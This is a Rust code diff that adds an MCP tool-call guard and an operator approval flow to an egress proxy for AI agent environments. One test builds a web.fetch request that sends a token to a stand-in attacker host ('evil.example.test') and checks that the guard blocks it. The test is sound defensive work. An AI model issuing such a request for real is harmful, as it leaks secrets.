@@ -28,6 +28,7 @@ use axum::{
     routing::any,
     Router,
 };
+use http_body_util::BodyExt;
 use reqwest::redirect::Policy as RedirectPolicy;
 use tokio::sync::RwLock;
 use url::Url;
@@ -41,6 +42,8 @@ struct ProxyState {
     client: reqwest::Client,
     events: Arc<dyn EventEmitter>,
     rate_limits: Arc<Mutex<BTreeMap<String, FixedWindowLimiter>>>,
+    mcp_guard_states: Arc<Mutex<BTreeMap<String, agentenv_mcp::guard::GuardSessionState>>>,
+    approval_coordinator: Option<agentenv_approvals::ApprovalCoordinator>,
 }
 
 #[derive(Debug, Clone)]
@@ -103,6 +106,22 @@ async fn run_proxy(args: crate::ProxyRunArgs) -> Result<()> {
         vec![Box::new(SqliteSink::new(args.events_db.clone()))],
     );
     let events = Arc::new(dispatcher.emitter()) as Arc<dyn EventEmitter>;
+    let env_dir = args
+        .events_db
+        .parent()
+        .context("events db path must live under an env directory")?
+        .to_path_buf();
+    let approval_coordinator = Some(agentenv_approvals::ApprovalCoordinator::new(
+        agentenv_approvals::ApprovalCoordinatorConfig {
+            store: agentenv_approvals::ApprovalStore::open(&args.events_db)
+                .context("open approval store for egress proxy")?,
+            events: Arc::clone(&events),
+            poll_interval: Duration::from_millis(250),
+            overlay_path: Some(env_dir.join("approval-policy-overlay.yaml")),
+            proposal_path: Some(env_dir.join("approval-policy-proposals.yaml")),
+            notifications: None,
+        },
+    ));
     let client = reqwest::Client::builder()
         .no_proxy()
         .redirect(RedirectPolicy::none())
@@ -122,6 +141,8 @@ async fn run_proxy(args: crate::ProxyRunArgs) -> Result<()> {
                 .map(|(route_id, limit)| (route_id.clone(), FixedWindowLimiter::from_config(limit)))
                 .collect(),
         )),
+        mcp_guard_states: Arc::new(Mutex::new(BTreeMap::new())),
+        approval_coordinator,
     };
 
     let listener = tokio::net::TcpListener::bind(listen_addr(&config.listen_url)?)
@@ -223,6 +244,11 @@ async fn handle_proxy_request(
             StatusCode::TOO_MANY_REQUESTS,
             "rate limited\n",
         ));
+    }
+
+    let (guard_response, request) = maybe_handle_mcp_guard(&state, &route, request).await?;
+    if let Some(response) = guard_response {
+        return Ok(response);
     }
 
     let secret = state
@@ -552,6 +578,208 @@ fn rate_limit_allows(state: &ProxyState, route_id: &str) -> Result<bool> {
         .is_none_or(|limit| limit.allow(Instant::now())))
 }
 
+async fn maybe_handle_mcp_guard(
+    state: &ProxyState,
+    route: &BrokerRoute,
+    request: Request<Body>,
+) -> Result<(Option<Response<Body>>, Request<Body>)> {
+    let Some(config) = route.mcp_guard.as_ref().filter(|config| config.enabled) else {
+        return Ok((None, request));
+    };
+    if !matches!(route.service, BrokerService::Mcp { .. })
+        || request.method() != Method::POST
+        || !request_content_type_is_json(request.headers())
+    {
+        return Ok((None, request));
+    }
+
+    let (parts, body) = request.into_parts();
+    let bytes = body
+        .collect()
+        .await
+        .context("read MCP guard request body")?
+        .to_bytes();
+    let json = match serde_json::from_slice::<serde_json::Value>(&bytes) {
+        Ok(json) => json,
+        Err(error) => {
+            tracing::warn!(%error, route_id = %route.id, "egress proxy rejected malformed MCP JSON body");
+            let request = Request::from_parts(parts, Body::from(bytes));
+            return Ok((
+                Some(text_response(StatusCode::BAD_REQUEST, "invalid mcp json\n")),
+                request,
+            ));
+        }
+    };
+
+    let decision = {
+        let mut states = state
+            .mcp_guard_states
+            .lock()
+            .map_err(|_| anyhow::anyhow!("MCP guard state lock poisoned"))?;
+        let guard_state = states.entry(route.id.clone()).or_default();
+        agentenv_mcp::guard::evaluate_json_rpc_request(config, guard_state, &json)
+    };
+    let decision = match decision {
+        Ok(decision) => decision,
+        Err(error) => {
+            tracing::warn!(%error, route_id = %route.id, "egress proxy rejected malformed MCP tool call");
+            let request = Request::from_parts(parts, Body::from(bytes));
+            return Ok((
+                Some(text_response(StatusCode::FORBIDDEN, "mcp tool denied\n")),
+                request,
+            ));
+        }
+    };
+
+    emit_mcp_guard_event(state, route, &decision);
+
+    let action = decision.action;
+    let request = Request::from_parts(parts, Body::from(bytes));
+    match action {
+        agentenv_mcp::guard::GuardAction::Deny => Ok((
+            Some(text_response(StatusCode::FORBIDDEN, "mcp tool denied\n")),
+            request,
+        )),
+        agentenv_mcp::guard::GuardAction::RequestApproval => {
+            let response = response_for_mcp_approval_request(state, route, &decision).await?;
+            Ok((response, request))
+        }
+        agentenv_mcp::guard::GuardAction::Forward
+        | agentenv_mcp::guard::GuardAction::NotToolCall => Ok((None, request)),
+    }
+}
+
+async fn response_for_mcp_approval_request(
+    state: &ProxyState,
+    route: &BrokerRoute,
+    decision: &agentenv_mcp::guard::GuardDecision,
+) -> Result<Option<Response<Body>>> {
+    let Some(coordinator) = state.approval_coordinator.as_ref() else {
+        return Ok(Some(text_response(
+            StatusCode::SERVICE_UNAVAILABLE,
+            "mcp approval unavailable\n",
+        )));
+    };
+    let Some(tool_name) = decision.tool_name.as_ref() else {
+        return Ok(Some(text_response(
+            StatusCode::FORBIDDEN,
+            "mcp tool denied\n",
+        )));
+    };
+
+    let request_id = format!("req_{}", uuid::Uuid::now_v7());
+    let reason_code = mcp_guard_reason_code(decision.reason);
+    let default_scope = if decision.approval_mode == agentenv_proto::McpApprovalMode::PerSession {
+        agentenv_approvals::ApprovalScope::Session
+    } else {
+        agentenv_approvals::ApprovalScope::Once
+    };
+    let request = agentenv_approvals::ApprovalRequest::new(
+        request_id.clone(),
+        state.env_name.clone(),
+        agentenv_approvals::ApprovalKind::McpTool,
+        tool_name.clone(),
+        reason_code,
+        serde_json::json!({
+            "route_id": route.id,
+            "matched_policy": decision.matched_policy,
+            "guard_context": decision.redacted_event_context,
+        }),
+        time::OffsetDateTime::now_utc(),
+        default_scope,
+        Duration::from_secs(60),
+        crate::new_cli_trace_id(),
+    );
+
+    coordinator
+        .submit_request(request)
+        .await
+        .context("submit MCP tool approval request")?;
+    let approval = coordinator
+        .wait_for_decision(&request_id)
+        .await
+        .context("wait for MCP tool approval decision")?;
+
+    match approval.decision {
+        agentenv_approvals::ApprovalDecisionValue::Allow => {
+            if approval.scope == agentenv_approvals::ApprovalScope::Session {
+                let mut states = state
+                    .mcp_guard_states
+                    .lock()
+                    .map_err(|_| anyhow::anyhow!("MCP guard state lock poisoned"))?;
+                states
+                    .entry(route.id.clone())
+                    .or_default()
+                    .grant_session(tool_name.clone());
+            }
+            Ok(None)
+        }
+        agentenv_approvals::ApprovalDecisionValue::Deny => Ok(Some(text_response(
+            StatusCode::FORBIDDEN,
+            "mcp tool denied\n",
+        ))),
+    }
+}
+
+fn request_content_type_is_json(headers: &HeaderMap) -> bool {
+    headers
+        .get(header::CONTENT_TYPE)
+        .and_then(|value| value.to_str().ok())
+        .is_some_and(|value| {
+            value
+                .split(';')
+                .next()
+                .is_some_and(|mime| mime.trim().eq_ignore_ascii_case("application/json"))
+        })
+}
+
+fn emit_mcp_guard_event(
+    state: &ProxyState,
+    route: &BrokerRoute,
+    decision: &agentenv_mcp::guard::GuardDecision,
+) {
+    let Some(tool_name) = decision.tool_name.as_ref() else {
+        return;
+    };
+    let result = match decision.action {
+        agentenv_mcp::guard::GuardAction::Forward
+        | agentenv_mcp::guard::GuardAction::NotToolCall => ActivityResult::Ok,
+        agentenv_mcp::guard::GuardAction::Deny => ActivityResult::Denied,
+        agentenv_mcp::guard::GuardAction::RequestApproval => ActivityResult::PendingApproval,
+    };
+    let mut event = ActivityEvent::new(
+        crate::now_event_ts(),
+        ActivityKind::McpToolCall,
+        result,
+        crate::new_cli_trace_id(),
+    )
+    .with_env(state.env_name.clone())
+    .with_actor_value("kind", serde_json::json!("egress_proxy"))
+    .with_subject_value("route_id", serde_json::json!(route.id))
+    .with_subject_value("tool_name", serde_json::json!(tool_name))
+    .with_extra("guard_context", decision.redacted_event_context.clone())
+    .with_reason_code(mcp_guard_reason_code(decision.reason));
+    if let Some(policy) = decision.matched_policy.as_ref() {
+        event = event.with_subject_value("matched_policy", serde_json::json!(policy));
+    }
+    state.events.emit(event.redacted());
+}
+
+fn mcp_guard_reason_code(reason: agentenv_mcp::guard::GuardReason) -> &'static str {
+    match reason {
+        agentenv_mcp::guard::GuardReason::Disabled => "mcp_guard_disabled",
+        agentenv_mcp::guard::GuardReason::NotToolCall => "mcp_not_tool_call",
+        agentenv_mcp::guard::GuardReason::AllowedByPolicy => "mcp_allowed_by_policy",
+        agentenv_mcp::guard::GuardReason::ApprovalRequired => "mcp_approval_required",
+        agentenv_mcp::guard::GuardReason::UrlAllowlistViolation => "mcp_url_allowlist_violation",
+        agentenv_mcp::guard::GuardReason::CredentialLikeArgument => "mcp_credential_like_argument",
+        agentenv_mcp::guard::GuardReason::EnvVarLikeArgument => "mcp_env_var_like_argument",
+        agentenv_mcp::guard::GuardReason::RateLimited => "mcp_rate_limited",
+        agentenv_mcp::guard::GuardReason::CrossToolFlow => "mcp_cross_tool_flow",
+        agentenv_mcp::guard::GuardReason::MalformedToolCall => "mcp_malformed_tool_call",
+    }
+}
+
 async fn reload_policy(state: &ProxyState) {
     match read_json::<NetworkPolicy>(&state.config.policy_path).await {
         Ok(policy) => *state.policy.write().await = policy,
@@ -694,6 +922,7 @@ mod tests {
             credential_name: "OPENAI_API_KEY".to_owned(),
             request_path_prefix: "/v1/openai".to_owned(),
             allowed_hosts: BTreeSet::from(["api.openai.com".to_owned()]),
+            mcp_guard: None,
         }
     }
 
@@ -705,6 +934,7 @@ mod tests {
             credential_name: "ANTHROPIC_API_KEY".to_owned(),
             request_path_prefix: "/v1/anthropic".to_owned(),
             allowed_hosts: BTreeSet::from(["api.anthropic.com".to_owned()]),
+            mcp_guard: None,
         }
     }
 
@@ -716,6 +946,7 @@ mod tests {
             credential_name: "GITHUB_TOKEN".to_owned(),
             request_path_prefix: "/v1/github/api".to_owned(),
             allowed_hosts: BTreeSet::from(["api.github.com".to_owned()]),
+            mcp_guard: None,
         }
     }
 
@@ -727,6 +958,7 @@ mod tests {
             credential_name: "GITHUB_TOKEN".to_owned(),
             request_path_prefix: "/v1/github/git".to_owned(),
             allowed_hosts: BTreeSet::from(["github.com".to_owned()]),
+            mcp_guard: None,
         }
     }
 
@@ -740,6 +972,7 @@ mod tests {
             credential_name: "MCP_TOKEN".to_owned(),
             request_path_prefix: "/v1/mcp/primary".to_owned(),
             allowed_hosts: BTreeSet::from(["mcp.example.test".to_owned()]),
+            mcp_guard: None,
         }
     }
 
@@ -753,6 +986,7 @@ mod tests {
             credential_name: "oci.ghcr.io".to_owned(),
             request_path_prefix: "/v1/oci/ghcr.io".to_owned(),
             allowed_hosts: BTreeSet::from(["ghcr.io".to_owned()]),
+            mcp_guard: None,
         }
     }
 
@@ -766,6 +1000,7 @@ mod tests {
             credential_name: "MCP_TOKEN".to_owned(),
             request_path_prefix: "/v1/mcp/loopback".to_owned(),
             allowed_hosts: BTreeSet::from(["127.0.0.1".to_owned()]),
+            mcp_guard: None,
         }
     }
 
@@ -871,7 +1106,21 @@ mod tests {
                     })
                     .collect(),
             )),
+            mcp_guard_states: Arc::new(Mutex::new(BTreeMap::new())),
+            approval_coordinator: None,
         }
+    }
+
+    fn test_state_with_approvals(
+        root: &Path,
+        route: BrokerRoute,
+        policy: NetworkPolicy,
+        rate_limits: BTreeMap<String, EgressProxyRateLimit>,
+        approval_coordinator: Option<agentenv_approvals::ApprovalCoordinator>,
+    ) -> ProxyState {
+        let mut state = test_state(root, route, policy, rate_limits);
+        state.approval_coordinator = approval_coordinator;
+        state
     }
 
     #[test]
@@ -983,6 +1232,150 @@ mod tests {
 
         assert_eq!(transformed.headers()["authorization"], "Bearer mcp-real");
         assert_eq!(transformed.uri().path(), "/rpc");
+    }
+
+    #[tokio::test]
+    async fn mcp_guard_denies_url_allowlist_violation_before_credential_resolution() {
+        let root = temp_dir("agentenv-proxy-mcp-guard-deny");
+        fs::create_dir_all(&root).expect("temp dir should be created");
+        let mut route = test_mcp_route();
+        route.upstream_base_url = "https://93.184.216.34/rpc".parse().unwrap();
+        route.allowed_hosts = BTreeSet::from(["93.184.216.34".to_owned()]);
+        route.mcp_guard = Some(agentenv_proto::McpGuardConfig {
+            enabled: true,
+            default_approval: agentenv_proto::McpApprovalMode::Never,
+            tool_policies: [(
+                "web.fetch".to_owned(),
+                agentenv_proto::McpToolPolicy {
+                    url_allowlist: vec!["api.github.com".to_owned()],
+                    ..agentenv_proto::McpToolPolicy::default()
+                },
+            )]
+            .into_iter()
+            .collect(),
+            cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
+        });
+        let policy = policy_with_rules(&["93.184.216.34"], &[]);
+        let state = Arc::new(test_state(&root, route, policy.clone(), BTreeMap::new()));
+        fs::write(
+            &state.config.policy_path,
+            serde_json::to_vec(&policy).expect("policy should serialize"),
+        )
+        .expect("policy should be written");
+        let request = Request::builder()
+            .method("POST")
+            .uri("/v1/mcp/primary")
+            .header("content-type", "application/json")
+            .body(Body::from(
+                serde_json::to_vec(&serde_json::json!({
+                    "jsonrpc": "2.0",
+                    "id": 1,
+                    "method": "tools/call",
+                    "params": {
+                        "name": "web.fetch",
+                        "arguments": {"url": "https://evil.example.test/?token=secret"}
+                    }
+                }))
+                .expect("request body should serialize"),
+            ))
+            .expect("request should build");
+
+        let response = handle_proxy_request(Arc::clone(&state), request)
+            .await
+            .expect("guard denial should be handled");
+
+        assert_eq!(response.status(), StatusCode::FORBIDDEN);
+
+        let _ = fs::remove_dir_all(root);
+    }
+
+    #[tokio::test]
+    async fn mcp_guard_per_call_policy_waits_for_operator_denial() {
+        let root = temp_dir("agentenv-proxy-mcp-guard-approval");
+        fs::create_dir_all(&root).expect("temp dir should be created");
+        let mut route = test_mcp_route();
+        route.upstream_base_url = "https://93.184.216.34/rpc".parse().unwrap();
+        route.allowed_hosts = BTreeSet::from(["93.184.216.34".to_owned()]);
+        route.mcp_guard = Some(agentenv_proto::McpGuardConfig {
+            enabled: true,
+            default_approval: agentenv_proto::McpApprovalMode::PerCall,
+            tool_policies: BTreeMap::new(),
+            cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
+        });
+        let policy = policy_with_rules(&["93.184.216.34"], &[]);
+        let approval_db = root.join("events.db");
+        let coordinator = agentenv_approvals::ApprovalCoordinator::new(
+            agentenv_approvals::ApprovalCoordinatorConfig {
+                store: agentenv_approvals::ApprovalStore::open(&approval_db)
+                    .expect("approval store should open"),
+                events: Arc::new(agentenv_events::NoopEventEmitter),
+                poll_interval: std::time::Duration::from_millis(10),
+                overlay_path: None,
+                proposal_path: None,
+                notifications: None,
+            },
+        );
+        let state = Arc::new(test_state_with_approvals(
+            &root,
+            route,
+            policy.clone(),
+            BTreeMap::new(),
+            Some(coordinator),
+        ));
+        fs::write(
+            &state.config.policy_path,
+            serde_json::to_vec(&policy).expect("policy should serialize"),
+        )
+        .expect("policy should be written");
+        let approval_db_for_decider = approval_db.clone();
+        let decider = tokio::spawn(async move {
+            let store = agentenv_approvals::ApprovalStore::open(&approval_db_for_decider)
+                .expect("approval store should open");
+            loop {
+                let pending = store
+                    .list_requests(agentenv_approvals::ApprovalRequestFilter {
+                        env: Some("demo".to_owned()),
+                        status: Some(agentenv_approvals::ApprovalStatus::Pending),
+                    })
+                    .expect("approval requests should list");
+                if let Some(request) = pending.first() {
+                    store
+                        .record_decision(&agentenv_approvals::ApprovalDecisionRecord {
+                            request_id: request.id.clone(),
+                            decision: agentenv_approvals::ApprovalDecisionValue::Deny,
+                            scope: agentenv_approvals::ApprovalScope::Once,
+                            decided_by: "agentenv:test".to_owned(),
+                            decided_at: time::OffsetDateTime::now_utc(),
+                            reason: Some("test_denial".to_owned()),
+                            context: serde_json::json!({"source": "test"}),
+                            trace_id: request.created_trace_id.clone(),
+                        })
+                        .expect("approval decision should record");
+                    break;
+                }
+                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+            }
+        });
+        let request = Request::builder()
+            .method("POST")
+            .uri("/v1/mcp/primary")
+            .header("content-type", "application/json")
+            .body(Body::from(
+                r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"filesystem.write","arguments":{"path":"/tmp/a"}}}"#,
+            ))
+            .expect("request should build");
+
+        let response = handle_proxy_request(Arc::clone(&state), request)
+            .await
+            .expect("guard denial should be handled");
+        tokio::time::timeout(std::time::Duration::from_millis(500), decider)
+            .await
+            .expect("approval request should be created and denied")
+            .expect("decider task should finish");
+
+        assert_eq!(response.status(), StatusCode::FORBIDDEN);
+
+        let _ = fs::remove_dir_all(root);
     }
 
     #[test]
